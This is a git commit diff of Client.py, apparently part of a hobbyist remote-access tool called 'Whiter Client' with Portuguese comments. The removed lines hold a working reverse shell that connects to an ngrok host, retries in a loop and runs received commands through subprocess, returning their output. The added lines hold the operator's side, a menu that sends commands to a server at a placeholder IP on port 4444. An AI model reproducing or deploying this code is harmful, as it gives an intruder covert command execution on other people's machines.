9dffd6a17f425a652de277f6969280e3401da370
Jhon <vicentinreidelas0@gmail.com>
2025-04-22 15:02:37 -0300

    Update Client.py

--- Client.py
+++ Client.py
@@ -1,40 +1,41 @@
 import socket
-import subprocess
-import os
 
-HOST = '0.tcp.ngrok.io'  # TROCA PELO SEU IP DO NGROK
-PORT = 12345             # TROCA PELA PORTA DO NGROK
+HOST = 'SEU_IP_AQUI'
+PORT = 4444
 
-def connect():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((HOST, PORT))
-            banner = """
+def banner():
+    print("""
 ██╗    ██╗██╗  ██╗██╗████████╗███████╗██████╗     
 ██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██╔══██╗    
 ██║ █╗ ██║███████║██║   ██║   █████╗  ██████╔╝    
 ██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██╔══██╗    
 ╚███╔███╔╝██║  ██║██║   ██║   ███████╗██║  ██║    
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    
-        W H I T E R   C L I E N T   V2.1 By Jhon
-"""
-            s.send(banner.encode())
-            while True:
-                comando = s.recv(1024).decode()
-                if comando.lower() == 'exit':
-                    break
-                elif comando.startswith('cd '):
-                    try:
-                        os.chdir(comando[3:])
-                        s.send(f"[+] Diretório: {os.getcwd()}".encode())
-                    except Exception as e:
-                        s.send(f"[!] Erro: {str(e)}".encode())
-                else:
-                    resultado = subprocess.getoutput(comando)
-                    s.send(resultado.encode() if resultado else b'[+] Executado.')
-            s.close()
-        except:
-            continue
+     W H I T E R   C L I E N T   V2
+""")
 
-connect()
+def menu():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((HOST, PORT))
+    print(s.recv(2048).decode())  # Banner do servidor
+
+    while True:
+        print("\n[ MENU ]")
+        print("1 - Enviar comando")
+        print("2 - Sair")
+        op = input("> ")
+
+        if op == "1":
+            comando = input("Comando > ")
+            s.send(comando.encode())
+            resposta = s.recv(4096).decode()
+            print(resposta)
+        elif op == "2":
+            s.send(b"exit")
+            break
+        else:
+            print("Opção inválida.")
+    s.close()
+
+banner()
+menu()
